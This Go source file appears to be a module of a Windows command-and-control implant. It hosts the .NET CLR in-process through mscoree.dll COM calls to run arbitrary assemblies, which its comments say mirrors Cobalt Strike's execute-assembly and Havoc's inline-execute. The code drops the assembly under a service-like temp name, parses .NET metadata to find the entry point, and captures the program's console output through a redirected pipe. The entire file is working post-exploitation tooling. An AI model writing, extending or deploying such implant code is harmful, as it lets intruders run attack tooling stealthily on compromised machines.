//go:build windows

package agent

// ExecuteAssembly — in-process .NET CLR hosting via mscoree.dll COM APIs.
//
// Technique mirrors Cobalt Strike execute-assembly / Havoc dotnet inline-execute:
//   CLRCreateInstance → ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost
//   → redirect stdout via anonymous pipe → ExecuteInDefaultAppDomain → capture output
//
// No CGO — uses syscall.SyscallN for COM vtable dispatch and
// golang.org/x/sys/windows for pipe/handle operations.

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── CLR COM GUIDs ─────────────────────────────────────────────────────────────

var (
	clsidCLRMetaHost    = windows.GUID{Data1: 0x9280188d, Data2: 0x0e8e, Data3: 0x4867, Data4: [8]byte{0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}}
	iidICLRMetaHost     = windows.GUID{Data1: 0xd332db9e, Data2: 0xb9b3, Data3: 0x4125, Data4: [8]byte{0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16}}
	clsidCLRRuntimeHost = windows.GUID{Data1: 0x90f1a06e, Data2: 0x7712, Data3: 0x4762, Data4: [8]byte{0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02}}
	iidICLRRuntimeHost  = windows.GUID{Data1: 0x90f1a06c, Data2: 0x7712, Data3: 0x4762, Data4: [8]byte{0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02}}
	iidICLRRuntimeInfo  = windows.GUID{Data1: 0xbd39d1d2, Data2: 0xba2f, Data3: 0x486a, Data4: [8]byte{0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91}}
)

// ── lazy DLL + proc refs ──────────────────────────────────────────────────────

var (
	mscoree       = windows.NewLazySystemDLL("mscoree.dll")
	clrCreateInst = mscoree.NewProc("CLRCreateInstance")

	// kernel32 is declared in inject_windows.go; we add what we need here.
	procSetStdHandle = kernel32.NewProc("SetStdHandle")
	procGetStdHandle = kernel32.NewProc("GetStdHandle")
)

const (
	stdOutputHandle = uintptr(0xFFFFFFF5) // (DWORD)-11
	stdErrorHandle  = uintptr(0xFFFFFFF4) // (DWORD)-12
)

// ── COM vtable helper ─────────────────────────────────────────────────────────

// clrVtblCall invokes method at vtable index idx on a COM interface pointer.
// The 'this' pointer is prepended automatically; args are the remaining params.
// Returns the raw HRESULT and an error for FAILED() HRESULTs.
func clrVtblCall(this uintptr, idx int, args ...uintptr) (uint32, error) {
	if this == 0 {
		return 0x80004003, fmt.Errorf("nil COM pointer at vtbl[%d]", idx)
	}
	vtbl := *(*uintptr)(unsafe.Pointer(this))
	fn := *(*uintptr)(unsafe.Pointer(vtbl + uintptr(idx)*8))

	all := make([]uintptr, 0, 1+len(args))
	all = append(all, this)
	all = append(all, args...)

	r1, _, _ := syscall.SyscallN(fn, all...)
	hr := uint32(r1)
	if hr&0x80000000 != 0 {
		return hr, fmt.Errorf("HRESULT 0x%08X", hr)
	}
	return hr, nil
}

// ── .NET PE metadata parser ───────────────────────────────────────────────────

// netEntryPoint parses a .NET PE file and returns the entry point type and
// method names. Returns ("", "") if parsing fails; callers fall back to defaults.
func netEntryPoint(pe []byte) (typeName, methodName string) {
	safe := func(off, n int) bool { return off >= 0 && off+n <= len(pe) }
	read16 := func(off int) uint16 {
		if !safe(off, 2) {
			return 0
		}
		return binary.LittleEndian.Uint16(pe[off:])
	}
	read32 := func(off int) uint32 {
		if !safe(off, 4) {
			return 0
		}
		return binary.LittleEndian.Uint32(pe[off:])
	}
	read64 := func(off int) uint64 {
		if !safe(off, 8) {
			return 0
		}
		return binary.LittleEndian.Uint64(pe[off:])
	}

	// MZ header
	if !safe(0, 4) || pe[0] != 'M' || pe[1] != 'Z' {
		return "", ""
	}
	peOff := int(read32(0x3c))
	if !safe(peOff, 4) || pe[peOff] != 'P' || pe[peOff+1] != 'E' {
		return "", ""
	}

	coffOff := peOff + 4
	numSections := int(read16(coffOff + 2))
	optHdrOff := coffOff + 20

	// Determine pointer sizes by PE magic
	magic := read16(optHdrOff)
	var ddTableOff int
	switch magic {
	case 0x10b: // PE32
		ddTableOff = optHdrOff + 96
	case 0x20b: // PE32+
		ddTableOff = optHdrOff + 112
	default:
		return "", ""
	}

	// Section headers follow the optional header
	var optHdrSize int
	if magic == 0x10b {
		optHdrSize = 224
	} else {
		optHdrSize = 240
	}
	sectionOff := optHdrOff + optHdrSize

	// rvaToOff converts a Relative Virtual Address to a file offset.
	rvaToOff := func(rva uint32) int {
		for i := 0; i < numSections; i++ {
			sh := sectionOff + i*40
			if !safe(sh, 40) {
				break
			}
			vAddr := read32(sh + 12)
			vSize := read32(sh + 8)
			rawOff := read32(sh + 20)
			if rva >= vAddr && rva < vAddr+vSize {
				return int(rawOff + rva - vAddr)
			}
		}
		return -1
	}

	// DataDirectory[14] = COM (CLR) Descriptor
	comDirOff := ddTableOff + 14*8
	comRVA := read32(comDirOff)
	if comRVA == 0 {
		return "", ""
	}
	comOff := rvaToOff(comRVA)
	if comOff < 0 || !safe(comOff, 24) {
		return "", ""
	}

	// IMAGE_COR20_HEADER
	// +0  cb            uint32
	// +8  MetaData.VirtualAddress  uint32
	// +12 MetaData.Size            uint32
	// +16 Flags                    uint32
	// +20 EntryPointToken / RVA    uint32
	metaRVA := read32(comOff + 8)
	flags := read32(comOff + 16)
	epToken := read32(comOff + 20)

	// If the native-entry-point flag is set we cannot parse a managed token.
	if flags&0x10 != 0 {
		return "", ""
	}
	// Token table type 0x06 = MethodDef
	if epToken>>24 != 0x06 {
		return "", ""
	}
	epRow := int(epToken & 0x00FFFFFF) // 1-based

	metaOff := rvaToOff(metaRVA)
	if metaOff < 0 || !safe(metaOff, 20) {
		return "", ""
	}
	// Metadata root signature: BSJB
	if pe[metaOff] != 'B' || pe[metaOff+1] != 'S' || pe[metaOff+2] != 'J' || pe[metaOff+3] != 'B' {
		return "", ""
	}

	// Version string length (padded to 4 bytes)
	vLen := int(read32(metaOff + 12))
	vLen = (vLen + 3) &^ 3

	// StreamHeader array starts after: 4+2+2+4+vLen+2+2 = 16+vLen
	numStreams := int(read16(metaOff + 16 + vLen + 2))
	shOff := metaOff + 16 + vLen + 4

	var tablesStreamOff, stringsStreamOff int
	for i := 0; i < numStreams && safe(shOff, 8); i++ {
		sOffset := int(read32(shOff))
		nameOff := shOff + 8
		end := nameOff
		for end < len(pe) && pe[end] != 0 {
			end++
		}
		name := string(pe[nameOff:end])
		padded := ((end - nameOff + 1) + 3) &^ 3
		shOff = nameOff + padded

		switch name {
		case "#~":
			tablesStreamOff = metaOff + sOffset
		case "#Strings":
			stringsStreamOff = metaOff + sOffset
		}
		_ = sOffset
	}
	if tablesStreamOff == 0 || stringsStreamOff == 0 {
		return "", ""
	}

	// #~ stream header
	// +0  Reserved (4)
	// +4  MajorVersion (1)  MinorVersion (1)
	// +6  HeapSizes (1)
	// +7  Reserved (1)
	// +8  Valid bitmask (8)
	// +16 Sorted bitmask (8)
	// +24 row counts for each set bit in Valid
	if !safe(tablesStreamOff, 24) {
		return "", ""
	}
	heapSizes := pe[tablesStreamOff+6]
	strIdxW := 2
	if heapSizes&1 != 0 {
		strIdxW = 4
	}
	blobIdxW := 2
	if heapSizes&4 != 0 {
		blobIdxW = 4
	}
	guidIdxW := 2
	if heapSizes&2 != 0 {
		guidIdxW = 4
	}
	_ = guidIdxW

	valid := read64(tablesStreamOff + 8)

	// Count rows for each present table (bit → count)
	rowCountOff := tablesStreamOff + 24
	rowCount := map[int]int{}
	for b := 0; b < 64; b++ {
		if valid&(1<<uint(b)) != 0 {
			if safe(rowCountOff, 4) {
				rowCount[b] = int(read32(rowCountOff))
				rowCountOff += 4
			}
		}
	}

	tableDataOff := rowCountOff

	// We need two table row sizes before TypeDef (table 0x02) and MethodDef (0x06).
	// Sizes depend on coded index widths and heap index widths.
	// For our purposes we only need to count rows across tables 0..N to reach
	// the TypeDef and MethodDef offsets.

	// Row sizes for tables we must skip (simplified, only what we need):
	//   0x00 Module:      2 + strIdxW + guidIdxW + guidIdxW + guidIdxW
	//   0x01 TypeRef:     typeDefOrRefW + strIdxW + strIdxW
	//   0x02 TypeDef:     4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW + methodListW
	//   0x04 Field:       2 + strIdxW + blobIdxW
	//   0x06 MethodDef:   4 + 2 + 2 + strIdxW + blobIdxW + paramListW

	// Coded index widths (TypeDefOrRef):
	tdOrRefN := maxN(rowCount[0x00], rowCount[0x01], rowCount[0x02], rowCount[0x1b])
	typeDefOrRefW := 2
	if tdOrRefN > (0xFFFF >> 2) {
		typeDefOrRefW = 4
	}

	// Simple index widths
	fieldListW := 2
	if rowCount[0x04] > 0xFFFF {
		fieldListW = 4
	}
	methodListW := 2
	if rowCount[0x06] > 0xFFFF {
		methodListW = 4
	}
	paramListW := 2
	if rowCount[0x08] > 0xFFFF {
		paramListW = 4
	}

	moduleSz := 2 + strIdxW + guidIdxW + guidIdxW + guidIdxW
	typeRefSz := typeDefOrRefW + strIdxW + strIdxW
	typeDefSz := 4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW + methodListW
	fieldSz := 2 + strIdxW + blobIdxW
	methodDefSz := 4 + 2 + 2 + strIdxW + blobIdxW + paramListW

	_ = fieldSz
	_ = typeRefSz

	// Navigate to each table by skipping over prior ones (in table ID order)
	cur := tableDataOff
	tableStart := map[int]int{}
	orderedTables := []int{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06}
	tableSizes := map[int]int{
		0x00: moduleSz,
		0x01: typeRefSz,
		0x02: typeDefSz,
		0x03: 0, // ignore (not usually present)
		0x04: fieldSz,
		0x05: 0,
		0x06: methodDefSz,
	}
	for _, tbl := range orderedTables {
		tableStart[tbl] = cur
		if n, ok := rowCount[tbl]; ok && n > 0 {
			cur += n * tableSizes[tbl]
		}
	}

	methodDefBase := tableStart[0x06]
	typeDefBase := tableStart[0x02]

	if epRow < 1 || epRow > rowCount[0x06] {
		return "", ""
	}

	// Read MethodDef row for the entry point
	mdRowOff := methodDefBase + (epRow-1)*methodDefSz
	if !safe(mdRowOff, methodDefSz) {
		return "", ""
	}
	// MethodDef: RVA(4) + ImplFlags(2) + Flags(2) + Name(strIdxW) + Sig(blobIdxW) + ParamList(paramListW)
	var mdNameIdx uint32
	if strIdxW == 2 {
		mdNameIdx = uint32(read16(mdRowOff + 8))
	} else {
		mdNameIdx = read32(mdRowOff + 8)
	}

	// Read MethodDef first param list index (to find owning type)
	mdParamListIdx := 0
	plo := mdRowOff + 8 + strIdxW + blobIdxW
	if paramListW == 2 {
		mdParamListIdx = int(read16(plo))
	} else {
		mdParamListIdx = int(read32(plo))
	}
	_ = mdParamListIdx

	// Walk TypeDef table to find the type that owns this method
	// TypeDef: Flags(4) + Name(strIdxW) + Namespace(strIdxW) + Extends(typeDefOrRefW) + FieldList(fieldListW) + MethodList(methodListW)
	var ownerNameIdx, ownerNsIdx uint32
	for row := 0; row < rowCount[0x02]; row++ {
		tdOff := typeDefBase + row*typeDefSz
		if !safe(tdOff, typeDefSz) {
			break
		}
		// MethodList column: offset = 4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW
		mlColOff := tdOff + 4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW
		var methodListStart int
		if methodListW == 2 {
			methodListStart = int(read16(mlColOff))
		} else {
			methodListStart = int(read32(mlColOff))
		}
		// Find end of method list (next typedef's methodListStart, or total count+1)
		var methodListEnd int
		if row+1 < rowCount[0x02] {
			nextTdOff := typeDefBase + (row+1)*typeDefSz
			if safe(nextTdOff, typeDefSz) {
				mlColOff2 := nextTdOff + 4 + strIdxW + strIdxW + typeDefOrRefW + fieldListW
				if methodListW == 2 {
					methodListEnd = int(read16(mlColOff2))
				} else {
					methodListEnd = int(read32(mlColOff2))
				}
			}
		} else {
			methodListEnd = rowCount[0x06] + 1
		}
		if epRow >= methodListStart && epRow < methodListEnd {
			// Name column: offset 4
			if strIdxW == 2 {
				ownerNameIdx = uint32(read16(tdOff + 4))
				ownerNsIdx = uint32(read16(tdOff + 4 + strIdxW))
			} else {
				ownerNameIdx = read32(tdOff + 4)
				ownerNsIdx = read32(tdOff + 4 + strIdxW)
			}
			break
		}
	}

	// Read strings from #Strings heap
	strAt := func(idx uint32) string {
		off := stringsStreamOff + int(idx)
		if !safe(off, 1) {
			return ""
		}
		end := off
		for end < len(pe) && pe[end] != 0 {
			end++
		}
		return string(pe[off:end])
	}

	mName := strAt(mdNameIdx)
	tName := strAt(ownerNameIdx)
	ns := strAt(ownerNsIdx)
	if ns != "" {
		tName = ns + "." + tName
	}
	return tName, mName
}

// maxN returns the largest of the provided ints (helper for coded-index width).
func maxN(vals ...int) int {
	m := 0
	for _, v := range vals {
		if v > m {
			m = v
		}
	}
	return m
}

// ── Main CLR execution function ───────────────────────────────────────────────

// ExecuteAssembly runs a .NET assembly in-process by hosting the CLR via
// mscoree.dll COM APIs.
//
//   - asmBytes: raw .NET PE file bytes
//   - args:     argument string passed to ExecuteInDefaultAppDomain
//   - typeName: entry type  (empty = auto-detected from PE, then "Program")
//   - methodName: entry method (empty = auto-detected, then "Main")
//
// Returns the text captured from Console.Write* output and any execution error.
func ExecuteAssembly(asmBytes []byte, args, typeName, methodName string) (string, error) {
	// ── 1. Write assembly to a temp file ─────────────────────────────────────
	rng := rand.New(rand.NewSource(time.Now().UnixNano())) //nolint:gosec
	tmpPath := filepath.Join(os.TempDir(),
		fmt.Sprintf("svc%08x.exe", rng.Uint32()))
	if err := os.WriteFile(tmpPath, asmBytes, 0600); err != nil {
		return "", fmt.Errorf("write temp assembly: %w", err)
	}
	defer func() { os.Remove(tmpPath) }() //nolint:errcheck

	// ── 2. Determine entry point ──────────────────────────────────────────────
	if typeName == "" || methodName == "" {
		t, m := netEntryPoint(asmBytes)
		if typeName == "" {
			typeName = t
		}
		if methodName == "" {
			methodName = m
		}
	}
	if typeName == "" {
		typeName = "Program"
	}
	if methodName == "" {
		methodName = "Main"
	}

	// ── 3. Redirect stdout + stderr to an anonymous pipe ──────────────────────
	sa := windows.SecurityAttributes{InheritHandle: 1}
	sa.Length = uint32(unsafe.Sizeof(sa))
	var rPipe, wPipe windows.Handle
	if err := windows.CreatePipe(&rPipe, &wPipe, &sa, 0); err != nil {
		return "", fmt.Errorf("CreatePipe: %w", err)
	}
	// Don't let child inherit the read end.
	windows.SetHandleInformation(rPipe, windows.HANDLE_FLAG_INHERIT, 0)

	origOut, _, _ := procGetStdHandle.Call(stdOutputHandle)
	origErr, _, _ := procGetStdHandle.Call(stdErrorHandle)
	procSetStdHandle.Call(stdOutputHandle, uintptr(wPipe))
	procSetStdHandle.Call(stdErrorHandle, uintptr(wPipe))

	// restore handles on exit no matter what
	defer func() {
		procSetStdHandle.Call(stdOutputHandle, origOut)
		procSetStdHandle.Call(stdErrorHandle, origErr)
	}()

	// ── 4. Load CLR via ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost ─────
	var pMetaHost uintptr
	r1, _, _ := clrCreateInst.Call(
		uintptr(unsafe.Pointer(&clsidCLRMetaHost)),
		uintptr(unsafe.Pointer(&iidICLRMetaHost)),
		uintptr(unsafe.Pointer(&pMetaHost)),
	)
	if uint32(r1)&0x80000000 != 0 || pMetaHost == 0 {
		windows.CloseHandle(wPipe)
		windows.CloseHandle(rPipe)
		return "", fmt.Errorf("CLRCreateInstance(MetaHost): HRESULT 0x%08X", uint32(r1))
	}

	v4W, _ := windows.UTF16PtrFromString("v4.0.30319")
	var pRuntimeInfo uintptr
	// ICLRMetaHost::GetRuntime = vtbl[3]
	if _, err := clrVtblCall(pMetaHost, 3,
		uintptr(unsafe.Pointer(v4W)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeInfo)),
		uintptr(unsafe.Pointer(&pRuntimeInfo)),
	); err != nil {
		windows.CloseHandle(wPipe)
		windows.CloseHandle(rPipe)
		return "", fmt.Errorf("GetRuntime: %w", err)
	}

	var pRuntimeHost uintptr
	// ICLRRuntimeInfo::GetInterface = vtbl[9]
	if _, err := clrVtblCall(pRuntimeInfo, 9,
		uintptr(unsafe.Pointer(&clsidCLRRuntimeHost)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeHost)),
		uintptr(unsafe.Pointer(&pRuntimeHost)),
	); err != nil {
		windows.CloseHandle(wPipe)
		windows.CloseHandle(rPipe)
		return "", fmt.Errorf("GetInterface(ICLRRuntimeHost): %w", err)
	}

	// ICLRRuntimeHost::Start = vtbl[3]
	// S_FALSE (1) means already started — treat as success.
	if hr, _ := clrVtblCall(pRuntimeHost, 3); hr != 0 && hr != 1 {
		windows.CloseHandle(wPipe)
		windows.CloseHandle(rPipe)
		return "", fmt.Errorf("ICLRRuntimeHost::Start: HRESULT 0x%08X", hr)
	}

	// ── 5. Execute the assembly ───────────────────────────────────────────────
	asmPathW, _ := windows.UTF16PtrFromString(tmpPath)
	typeNameW, _ := windows.UTF16PtrFromString(typeName)
	methodNameW, _ := windows.UTF16PtrFromString(methodName)
	argsW, _ := windows.UTF16PtrFromString(args)
	var retVal uint32

	// ICLRRuntimeHost::ExecuteInDefaultAppDomain = vtbl[9]
	hr, execErr := clrVtblCall(pRuntimeHost, 9,
		uintptr(unsafe.Pointer(asmPathW)),
		uintptr(unsafe.Pointer(typeNameW)),
		uintptr(unsafe.Pointer(methodNameW)),
		uintptr(unsafe.Pointer(argsW)),
		uintptr(unsafe.Pointer(&retVal)),
	)
	_ = hr

	// ── 6. Collect captured output ────────────────────────────────────────────
	// Close write end of pipe so ReadFile returns EOF.
	windows.CloseHandle(wPipe)

	var sb strings.Builder
	buf := make([]byte, 4096)
	for {
		var n uint32
		e := windows.ReadFile(rPipe, buf, &n, nil)
		if n > 0 {
			sb.Write(buf[:n])
		}
		if e != nil {
			break
		}
	}
	windows.CloseHandle(rPipe)

	out := sb.String()
	if execErr != nil {
		if out != "" {
			out += "\n"
		}
		out += fmt.Sprintf("[!] CLR exec error: %v (retval=%d, type=%s method=%s)",
			execErr, retVal, typeName, methodName)
	} else if out == "" {
		out = fmt.Sprintf("[+] .NET assembly executed (retval=%d)", retVal)
	}
	return out, nil
}
